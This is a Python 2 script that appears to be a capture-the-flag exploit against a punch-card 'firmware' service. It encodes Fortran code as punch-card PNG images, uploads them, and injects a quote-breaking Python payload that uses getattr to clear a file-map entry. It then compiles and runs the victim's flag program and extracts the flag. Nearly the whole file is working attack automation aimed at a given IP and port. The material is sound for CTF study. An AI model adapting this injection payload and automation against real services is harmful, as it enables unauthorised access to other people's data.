#!/usr/bin/env python

import socket
import sys
import os
import re
import base64
import subprocess
from pexpect import fdpexpect
from PIL import Image, ImageDraw
from StringIO import StringIO



def usage():
    print "Usage: %s [-s] <ip> <port> <flag_id>" % os.path.basename(__file__)
    print
    print "Optional:"
    print "     -s          Show the punch card used as a program"


CARD_ROWS = 12
CARD_COLS = 80
CARD_HOLE_W = 15
CARD_HOLE_H = 20
CARD_HOLE_RAD = 6
W0YAGER_MODEL_42_KEYPUNCH = """
    //,0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"()_=;*' |
12 / O           OOOOOOOOO                        OOOOOO             OOOOOOOO |
11|   O                   OOOOOOOOO                     OOOOOO       OOOOOOOO |
 0|    O                           OOOOOOOOO                  OOOOOOO         |
 1|     O        O        O        O                                          |
 2|      O        O        O        O       O     O     O     O      O        |
 3|       O        O        O        O       O     O     O     O      O       |
 4|        O        O        O        O       O     O     O     O      O      |
 5|         O        O        O        O       O     O     O     O      O     |
 6|          O        O        O        O       O     O     O     O      O    |
 7|           O        O        O        O       O     O     O     O      O   |
 8|            O        O        O        O OOOOOOOOOOOOOOOOOOOOOOOOO      O  |
 9|             O        O        O        O                        O       O |
  |___________________________________________________________________________|"""

# Create the mapping between character and holes
translate = {}
# Turn the ASCII art sideways and build a hash look up for
# column values, for example:
#   A:(O, , ,O, , , , , , , , )
#   B:(O, , , ,O, , , , , , , )
#   C:(O, , , , ,O, , , , , , )
rows = W0YAGER_MODEL_42_KEYPUNCH[1:].split('\n');
rotated = [[ r[i] for r in rows[:CARD_ROWS + 1]]
        for i in range(5, len(rows[0]) - 1)]
for v in rotated:
    translate[v[0]] = tuple(v[1:])


global show_punch_card
show_punch_card = False
def create_card(line):
    """Create the PNG card which represent the line"""
    # One blank line on top
    height = (CARD_ROWS + 1) * CARD_HOLE_H
    # 2 margin on each side
    width = (CARD_COLS + 4) * CARD_HOLE_W
    im = Image.new("L", (width, height), 255)
    draw = ImageDraw.Draw(im)
    draw.polygon(
        [(1.5*CARD_HOLE_W, 0), (width,0), (width,height),
            (0,height), (0,3*CARD_HOLE_H)],
        fill=127)

    # Punch the card for each character in the line
    x = 1
    for c in range(CARD_COLS):
        x += 1
        y = 0
        char = line[c] if c < len(line) else ' '
        draw.text(
                [x * CARD_HOLE_W - CARD_HOLE_RAD + 2, 2],
                char, fill=0)
        holes = translate[char]
        for h in holes:
            y += 1
            center = (x * CARD_HOLE_W + 2, y * CARD_HOLE_H + 2)
            pos = [ (center[0] - CARD_HOLE_RAD, center[1] - CARD_HOLE_RAD),
                    (center[0] + CARD_HOLE_RAD, center[1] + CARD_HOLE_RAD) ]
            if h == 'O':
                draw.ellipse(pos, fill=255)
            else:
                t = ['12','11','0','1','2','3','4','5','6','7','8','9'][y-1]
                draw.text(pos[0], t, fill=0)

    # Return the base64 of the PNG image
    ret = StringIO();
    im.save(ret, "PNG")
    if show_punch_card: im.show()
    return base64.b64encode(ret.getvalue())


UPLOAD_PROMPT = "card\\[s\\] left:"
def fortran_write(conn, string):
    """Add fortran code to print the provided string"""
    # Create the list of strings to send
    strs = []
    cur = '"'
    for c in string:
        if c != '"' and c in translate:
            cur += c
        else:   # escape all characters which can't be send in punch cards
            strs.append(cur + '"')
            cur = '"'
            strs.append('CHAR(%d)' % ord(c))

    if cur != '"': strs.append(cur + '"')
    cmd = 'write(*,"(A)",advance="no") '
    
    # Contatenate and split the list of string to get lines
    max_len = CARD_COLS - len(cmd) + 2 # Max len of a line
    split_at = max_len - 1         # len at which a strin gmust be splitted
    flush_at = split_at - len('"//CHAR(123)//"')

    lines = []
    cur = ''
    for s in strs:
        cur += '//' + s
        l = None

        if len(cur) > max_len:
            l, cur = cur[:split_at] + '"', '//"' + cur[split_at:]
        elif len(cur) > flush_at:
            l, cur = cur, ''
        if l:
            lines.append(l[2:]) # Remove heading '//'

    if cur != "//": lines.append(cur[2:])

    # Send each punch card
    conn.sendline("upload %d" % (len(lines) + 2))
    send_fortran(conn, 'subroutine upstart();')
    for l in lines:
        send_fortran(conn, "%s%s" % (cmd, l))
    send_fortran(conn, 'end subroutine upstart')


def send_fortran(c, line):
    """Send a punch card"""
    c.expect(UPLOAD_PROMPT)
    c.sendline(create_card(line))



SESSION_PROMPT = "\\[S\\]tart new session or \\[R\\]esume existing session\\?"
UPLOADED_PROMPT = "Filename: (fw_[a-zA-Z0-9_]+\\.f90)"
PROMPT = '> '

EXPLOIT = "', 'k': getattr(getattr(self, 'filemap'), '__setitem__')" + \
        "(getattr('%s','decode')('hex'), None), 'k2': '"

def exploit(ip, port, flag_id):
    # Open connection
    sock = socket.create_connection((ip, port))
    conn = fdpexpect.fdspawn(sock.fileno())

    # Create session
    conn.expect(SESSION_PROMPT)
    conn.expect(PROMPT)
    conn.sendline("S")
    conn.expect(PROMPT)

    # Send th exploit firmware
    fortran_write(conn, EXPLOIT % flag_id.encode('hex'))

    # Compile and run the exploit firmware
    conn.expect(UPLOADED_PROMPT)
    filename = conn.match.group(1)
    conn.sendline("compile %s" % filename)
    conn.expect(PROMPT)
    conn.sendline("run %s" % filename)

    # Compile and run the flag firmware
    conn.expect(PROMPT)
    conn.sendline("compile %s" % flag_id)
    conn.expect(PROMPT)
    conn.sendline("run %s" % flag_id)

    # Return the flag
    conn.expect("'data': '(FLG\w+)'")
    return conn.match.group(1)


if __name__ == '__main__':
    if len(sys.argv) < 4:
        usage()
        sys.exit(1)
    elif len(sys.argv) > 4 and sys.argv[1] == '-s':
        show_punch_card = True
        sys.argv = sys.argv[1:]
        

    ip = sys.argv[1]
    port = int(sys.argv[2])
    flag_id = sys.argv[3]
    print exploit(ip, port, flag_id)
